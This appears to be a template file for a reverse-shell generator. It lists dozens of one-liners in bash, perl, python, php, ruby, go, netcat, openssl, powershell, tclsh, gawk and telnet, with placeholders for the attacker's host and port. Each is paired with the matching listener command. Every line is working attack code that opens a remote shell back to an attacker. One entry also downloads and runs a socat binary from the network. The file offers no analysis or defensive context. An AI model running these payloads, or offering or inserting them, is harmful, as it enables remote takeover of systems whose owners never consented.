bash-bash -i >& /dev/tcp/@/£ 0>&1
nc -lvnp £
bash1-0<&196;exec 196<>/dev/tcp/@/£; sh <&196 >&196 2>&196
nc -lvnp £
bashu-sh -i >& /dev/udp/@/£ 0>&1
nc -ulvnp £
socat-wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:@:£
socat file:`tty`,raw,echo=0 TCP-L:£
perl-perl -e 'use Socket;$i="@";$p=£;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
nc -lvnp £
perl1-perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"@:£");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
nc -lvnp £
perl2-perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"@:£");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
nc -lvnp £
python-export RHOST="@";export RPORT=£;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
nc -lvnp £
python1-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("@",£));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
nc -lvnp £
python2-python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("@",£));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
nc -lvnp £
php-php -r '$sock=fsockopen("@",£);exec("/bin/sh -i <&3 >&3 2>&3");'
nc -lvnp £
php1-php -r '$sock=fsockopen("@",£);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
nc -lvnp £
php2-php -r '$sock=fsockopen("@",£);`/bin/sh -i <&3 >&3 2>&3`;'
nc -lvnp £
php3-php -r '$sock=fsockopen("@",£);system("/bin/sh -i <&3 >&3 2>&3");'
nc -lvnp £
php4-php -r '$sock=fsockopen("@",£);passthru("/bin/sh -i <&3 >&3 2>&3");'
nc -lvnp £
php5-php -r '$sock=fsockopen("@",£);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
nc -lvnp £
ruby-ruby -rsocket -e 'exit if fork;c=TCPSocket.new("@","£");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
nc -lvnp £
ruby1-ruby -rsocket -e 'c=TCPSocket.new("@","£");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
nc -lvnp £
golang-echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","@:£");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
nc -lvnp £
netcatbsd-rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc @ £ >/tmp/f
nc -lvnp £
netcattrad-/bin/nc.traditional @ £ -e /bin/bash
nc -lvnp £
netcattrad1-/bin/nc.traditional @ £ -c /bin/bash
nc -lvnp £
ncat-ncat @ £ -e /bin/bash
nc -lvnp £
openssl-mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect @:£ > /tmp/s; rm /tmp/s
ncat --ssl -vv -l -p £
openssl1-mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect @:£ > /tmp/s; rm /tmp/s
yes "" | openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes;openssl s_server -quiet -key key.pem -cert cert.pem -port £
powershell-powershell -nop -c "$sm=(New-Object Net.Sockets.TCPClient('@',£)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}"
nc -lvnp £
powershell1-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('@',£);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
nc -lvnp £
tclsh-echo 'set s [socket @ £];while 42 { puts -nonewline $s "shell>";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | tclsh
nc -lvnp £
gawk-gawk 'BEGIN {P=£;S="> ";H="@";V="/inet/tcp/0/"H"/"P;while(1){do{printf S|&V;V|&getline c;if(c){while((c|&getline)>0)print $0|&V;close(c)}}while(c!="exit")close(V)}}'
nc -lvnp £
telnet-rm f;mkfifo f;cat f|/bin/sh -i 2>&1|telnet @ £ > f
nc -lvnp £
telnet1-rm -f x; mknod x p && telnet @ £ 0<x | /bin/bash 1>x
nc -lvnp £
